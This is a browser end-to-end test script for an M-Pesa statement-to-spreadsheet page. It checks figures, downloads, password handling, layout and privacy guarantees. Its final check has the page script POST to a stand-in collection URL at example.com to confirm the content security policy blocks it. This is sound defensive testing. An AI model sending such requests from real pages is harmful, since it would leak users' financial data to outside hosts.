"""End-to-end tests in a real browser.

    pip install playwright openpyxl && python -m playwright install chromium
    python tests/e2e.py                  # all checks
    python tests/e2e.py --readme-shot    # also rewrite docs/screenshot.png

Serves the repo on a local port, opens index.html in Chromium and, for each synthetic statement, uploads
it, reads the figures and checks the page shows, downloads the workbook and the CSV and opens them. The
figures are compared with tests/fixtures/synthetic/expected.json. It fails if any request leaves the page's
own origin, if the content security policy blocks anything, if the password turns up anywhere outside the
password box, if the page logs an error, or if it scrolls sideways at 1280 or 390 px wide.
"""
import argparse
import functools
import http.server
import io
import json
import sys
import threading
import zipfile
from pathlib import Path

import openpyxl
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent.parent
FIX = ROOT / "tests" / "fixtures" / "synthetic"
OUT = ROOT / "tests" / "output"
EXPECT = json.loads((FIX / "expected.json").read_text())
PASSWORD = EXPECT["password"]
SHEETS = ["Summary", "Transactions", "Monthly", "Counterparties"]
KPI = {"Money in": "totalIn", "Money out": "totalOut", "Opening balance": "opening", "Closing balance": "closing",
       "Charges & fees": "charges", "Fuliza drawn": "fulizaDrawn"}

passed, failed = [], []


def check(ok, what):
    (passed if ok else failed).append(what)
    if not ok:
        print("FAIL", what)


def num(s):
    return float(s.replace(",", ""))


def serve():
    handler = functools.partial(Quiet, directory=str(ROOT))
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, f"http://127.0.0.1:{httpd.server_address[1]}"


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass


def launch(p):
    try:
        return p.chromium.launch()
    except Exception:
        return p.chromium.launch(channel="chrome")


class Session:
    """One browser context. Records every request, console message and CSP violation."""

    def __init__(self, browser, base, width=1280, height=900):
        self.base, self.requests, self.console, self.errors = base, [], [], []
        self.ctx = browser.new_context(viewport={"width": width, "height": height}, accept_downloads=True)
        self.ctx.add_init_script("""
            window.__csp = [];
            document.addEventListener('securitypolicyviolation',
              (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));
        """)
        self.ctx.on("request", lambda r: self.requests.append(r.url))
        self.page = self.ctx.new_page()
        self.page.on("console", lambda m: self.console.append((m.type, m.text)))
        self.page.on("pageerror", lambda e: self.errors.append(str(e)))
        self.page.goto(base + "/", wait_until="networkidle")

    def upload(self, *names, password=None):
        if password is not None:
            self.page.fill("#pw", password)
        self.page.set_input_files("#fileInput", [str(FIX / n) for n in names])
        self.page.wait_for_function(
            "n => document.querySelectorAll('#files .file').length === n && !document.querySelector('#files .spin')",
            arg=len(names), timeout=60000)

    def file_messages(self):
        return [(li.get_attribute("class"), li.query_selector(".msg").inner_text()) for li in self.page.query_selector_all("#files .file")]

    def kpis(self):
        out = {}
        for el in self.page.query_selector_all("#kpis .kpi"):
            out[el.query_selector(".k").inner_text()] = el.query_selector(".v").inner_text()
        return out

    def checks(self):
        return [(el.get_attribute("class"), el.inner_text()) for el in self.page.query_selector_all("#checks .check")]

    def download(self, button):
        with self.page.expect_download() as d:
            self.page.click(button)
        return d.value.suggested_filename, Path(d.value.path()).read_bytes()

    def csp(self):
        return self.page.evaluate("window.__csp")

    def close(self):
        self.ctx.close()


def check_results(s, label, e):
    """The page's figures and checks against the expected summary."""
    k = s.kpis()
    for name, key in KPI.items():
        check(abs(num(k[name]) - e[key]) < 0.005, f"{label}: {name} shows {k[name]} (expected {e[key]:,.2f})")
    net = e["totalIn"] - e["totalOut"]
    check(abs(num(k["Net flow"]) - net) < 0.005, f"{label}: Net flow {k['Net flow']}")
    title = s.page.inner_text("#resTitle")
    check(title == e["name"], f"{label}: title shows the account name ({title})")
    sub = s.page.inner_text("#resSub")
    check(sub.startswith(f"{e['mobile']} | {e['count']:,} transactions from "), f"{label}: subtitle '{sub}'")
    cs = s.checks()
    if e["mismatches"] == 0:
        check(cs[0][0] == "check ok" and f"All {e['count'] - 1:,} rows follow" in cs[0][1], f"{label}: balances reconcile")
    else:
        check(cs[0][0] == "check bad" and cs[0][1].startswith(f"{e['mismatches']} row(s) don't follow"), f"{label}: mismatch shown")
    if e["pdfTotals"] is None:
        check(not any("statement summary" in t for _, t in cs), f"{label}: no statement-total check for merged files")
    else:
        agree = abs(e["pdfTotals"]["in"] - e["totalIn"]) < 0.005 and abs(e["pdfTotals"]["out"] - e["totalOut"]) < 0.005
        hit = [c for c in cs if "statement summary" in c[1]]
        check(len(hit) == 1 and (hit[0][0] == "check ok") == agree and
              ("Totals match" if agree else "Totals differ") in hit[0][1], f"{label}: statement TOTAL check ({'match' if agree else 'differ'})")
    shown = len(s.page.query_selector_all("#tx tbody tr"))
    check(shown == min(e["count"], 300), f"{label}: {shown} transactions listed")
    bad = len(s.page.query_selector_all("#tx tbody tr.bad"))
    check(bad == e["mismatches"], f"{label}: {bad} rows highlighted")
    counts = sum(int(td.inner_text()) for td in s.page.query_selector_all("#types tbody tr td:nth-child(2)"))
    check(counts == e["count"], f"{label}: by-type counts add up to {counts}")


def check_workbook(label, name, data, e, rows, files=1):
    check(name.endswith(".xlsx") and name.startswith("MPesa_"), f"{label}: workbook name {name}")
    wb = openpyxl.load_workbook(io.BytesIO(data), data_only=True)
    check(wb.sheetnames == SHEETS, f"{label}: sheets {wb.sheetnames}")
    tx = wb["Transactions"]
    head = [c.value for c in tx[1]]
    check(head[:12] == ["Date & time", "Receipt No.", "Details", "Type", "Counterparty", "Phone / Till / Paybill", "Account",
                        "Status", "Paid in", "Withdrawn", "Balance", "Balance check"], f"{label}: transaction columns")
    check((head[12:] == ["Source file"]) == (files > 1), f"{label}: source file column only when files are merged")
    data_rows = [[c.value for c in r] for r in tx.iter_rows(min_row=2, max_row=e["count"] + 1)]
    check(len(data_rows) == e["count"] and tx.max_row == e["count"] + 2, f"{label}: {len(data_rows)} transaction rows and a totals row")
    check([r[1] for r in data_rows] == [x["receipt"] for x in rows], f"{label}: receipts in order")
    check([r[3] for r in data_rows] == [x["type"] for x in rows], f"{label}: types")
    paid = round(sum(r[8] or 0 for r in data_rows), 2)
    out = round(sum(r[9] or 0 for r in data_rows), 2)
    check(abs(paid - e["totalIn"]) < 0.005 and abs(out - e["totalOut"]) < 0.005, f"{label}: workbook totals {paid:,.2f} in, {out:,.2f} out")
    check(abs(data_rows[-1][10] - e["closing"]) < 0.005, f"{label}: last balance {data_rows[-1][10]}")
    totals = [c.value for c in tx[e["count"] + 2]]
    check(totals[7] == "Totals" and abs(totals[8] - e["totalIn"]) < 0.005 and abs(totals[9] - e["totalOut"]) < 0.005,
          f"{label}: totals row")
    mism = sum(1 for r in data_rows if str(r[11]).startswith("Mismatch"))
    check(mism == e["mismatches"], f"{label}: {mism} rows flagged in the workbook")
    sm = wb["Summary"]
    vals = {sm.cell(r, 2).value: sm.cell(r, 3).value for r in range(1, sm.max_row + 1) if sm.cell(r, 2).value}
    for k, key in [("Opening balance", "opening"), ("Money in", "totalIn"), ("Money out", "totalOut"), ("Closing balance", "closing"),
                   ("Transaction charges & fees", "charges"), ("Fuliza drawn", "fulizaDrawn"), ("Fuliza repaid", "fulizaRepaid")]:
        check(abs(vals[k] - e[key]) < 0.005, f"{label}: Summary sheet {k} {vals[k]}")
    check(vals["Transactions"] == e["count"], f"{label}: Summary sheet count")
    mo = wb["Monthly"]
    months = [r for r in mo.iter_rows(min_row=2, values_only=True) if r[0] not in (None, "Total")]
    check(sum(r[1] for r in months) == e["count"], f"{label}: monthly counts add up")
    return wb


def check_csv(label, name, data, e):
    check(name.endswith(".csv"), f"{label}: CSV name {name}")
    check(data[:3] == b"\xef\xbb\xbf", f"{label}: CSV starts with the UTF-8 byte order mark")
    lines = data[3:].decode("utf-8").split("\r\n")
    check(len(lines) == e["count"] + 1, f"{label}: CSV has {len(lines) - 1} rows")


def no_password_in(label, *blobs):
    pw = PASSWORD.encode()
    for what, b in blobs:
        if what.endswith(".xlsx"):
            with zipfile.ZipFile(io.BytesIO(b)) as z:
                hit = any(pw in z.read(n) for n in z.namelist())
        else:
            hit = pw in b
        check(not hit, f"{label}: password not in {what}")


def run(browser, base, readme_shot):
    OUT.mkdir(parents=True, exist_ok=True)
    sessions = []

    # single statements
    for name, e in EXPECT["statements"].items():
        if e.get("error") or e.get("password"):
            continue
        s = Session(browser, base)
        sessions.append(s)
        s.upload(name)
        msgs = s.file_messages()
        check(msgs[0][0] == "file " and msgs[0][1].startswith(f"{e['summary']['count']:,} transactions"), f"{name}: file line '{msgs[0][1]}'")
        check_results(s, name, e["summary"])
        xn, xb = s.download("#dlXlsx")
        check_workbook(name, xn, xb, e["summary"], e["rows"])
        cn, cb = s.download("#dlCsv")
        check_csv(name, cn, cb, e["summary"])

    # two overlapping statements together
    m = EXPECT["merges"]["overlap"]
    s = Session(browser, base)
    sessions.append(s)
    s.upload(*m["files"])
    check_results(s, "overlap merged", m["summary"])
    xn, xb = s.download("#dlXlsx")
    wb = check_workbook("overlap merged", xn, xb, m["summary"], m["rows"], files=2)
    src = {r[12] for r in wb["Transactions"].iter_rows(min_row=2, max_row=m["summary"]["count"] + 1, values_only=True)}
    check(src == set(m["files"]), f"overlap merged: source files {sorted(src)}")

    # password: none, wrong, right, then the main password box
    e = EXPECT["statements"]["locked.pdf"]
    s = Session(browser, base)
    sessions.append(s)
    s.upload("locked.pdf")
    check(s.file_messages()[0] == ("file err", "This file is password-protected. Enter its password."), "locked: asks for the password")
    for attempt, want in [("WRONG000", "Wrong password. Try again."), (PASSWORD, None)]:
        before = s.file_messages()[0][1]
        s.page.fill("#files .retry input", attempt)
        s.page.click("#files .retry button")
        s.page.wait_for_function("b => { const m = document.querySelector('#files .file .msg'); return m && !document.querySelector('#files .spin') && m.textContent !== b; }",
                                 arg=before, timeout=60000)
        got = s.file_messages()[0]
        if want:
            check(got == ("file err", want), f"locked: wrong password message '{got[1]}'")
        else:
            check(got[0] == "file ", f"locked: opens with the right password ({got[1]})")
    check_results(s, "locked.pdf", e["summary"])
    xn, xb = s.download("#dlXlsx")
    check_workbook("locked.pdf", xn, xb, e["summary"], e["rows"])
    cn, cb = s.download("#dlCsv")
    store = s.page.evaluate("() => JSON.stringify([location.href, document.cookie, Object.entries(localStorage), Object.entries(sessionStorage), history.length])")
    html = s.page.evaluate("() => { const c = document.documentElement.cloneNode(true); c.querySelectorAll('input').forEach(i => i.remove()); return c.outerHTML; }")
    logs = "\n".join(t for _, t in s.console)
    no_password_in("locked", ("workbook.xlsx", xb), ("export.csv", cb), ("URL, cookies and storage", store.encode()),
                   ("the page outside the password boxes", html.encode()), ("the console", logs.encode()))
    s2 = Session(browser, base)
    sessions.append(s2)
    s2.upload("locked.pdf", password=PASSWORD)
    check(s2.file_messages()[0][0] == "file ", "locked: opens with the password typed first")

    # no text layer
    s = Session(browser, base)
    sessions.append(s)
    s.upload("scanned.pdf")
    got = s.file_messages()[0]
    check(got == ("file err", "This PDF has no readable text (it looks scanned). Download the statement again from the M-Pesa app."),
          f"scanned: '{got[1]}'")
    check(not s.page.is_visible("#results"), "scanned: no results shown")

    # layout at 1280 and 390 px, and the screenshots
    for w, h in [(1280, 900), (390, 844)]:
        s = Session(browser, base, w, h)
        sessions.append(s)
        sw = s.page.evaluate("document.documentElement.scrollWidth")
        check(sw <= w, f"empty page at {w}px: no sideways scroll ({sw})")
        s.page.screenshot(path=str(OUT / f"empty-{w}.png"), full_page=True)
        s.upload("clean_month.pdf")
        s.page.wait_for_timeout(200)
        sw = s.page.evaluate("document.documentElement.scrollWidth")
        check(sw <= w, f"results at {w}px: no sideways scroll ({sw})")
        s.page.screenshot(path=str(OUT / f"results-{w}.png"), full_page=True)
        if readme_shot and w == 1280:
            (ROOT / "docs").mkdir(exist_ok=True)
            s.page.screenshot(path=str(ROOT / "docs" / "screenshot.png"), full_page=True,
                              clip={"x": 0, "y": 0, "width": 1280, "height": 1240})

    # what left the page, across every session
    origin = base
    reqs = [u for s in sessions for u in s.requests]
    away = sorted({u for u in reqs if not (u.startswith(origin + "/") or u.startswith("data:") or u.startswith("blob:"))})
    check(not away, f"no request leaves the origin ({len(reqs)} requests; away: {away})")
    check(any(u.endswith("/lib/pdf.worker.min.js") for u in reqs), "the pdf.js worker loads from the page's own origin")
    csp = [v for s in sessions for v in s.csp()]
    check(not csp, f"no content security policy violations {csp}")
    errs = [x for s in sessions for x in s.errors] + [t for s in sessions for k, t in s.console if k == "error"]
    check(not errs, f"no page errors or console errors {errs[:3]}")
    for s in sessions:
        s.close()

    # the policy itself: a script on the page cannot reach another origin
    s = Session(browser, base)
    blocked = s.page.evaluate("""async () => {
        try { await fetch('https://example.com/collect', { method: 'POST', body: 'x' }); return 'sent'; }
        catch (e) { return 'blocked'; } }""")
    s.page.wait_for_timeout(200)
    check(blocked == "blocked" and any(v.startswith("connect-src") for v in s.csp()), "the policy blocks a request to another origin")
    s.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--readme-shot", action="store_true")
    args = ap.parse_args()
    httpd, base = serve()
    try:
        with sync_playwright() as p:
            browser = launch(p)
            run(browser, base, args.readme_shot)
            browser.close()
    finally:
        httpd.shutdown()
    print(f"{len(passed)} checks passed, {len(failed)} failed.")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
